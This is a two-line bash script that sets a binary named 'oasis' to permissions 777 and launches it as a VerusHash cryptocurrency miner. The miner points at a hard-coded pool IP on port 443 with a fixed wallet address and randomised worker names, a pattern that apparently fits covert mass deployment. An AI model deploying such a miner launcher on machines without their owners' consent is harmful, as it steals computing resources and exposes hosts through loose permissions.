#!/bin/bash

chmod 777 oasis
./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(shuf -n 1 -i 1-99999)-HM --password x
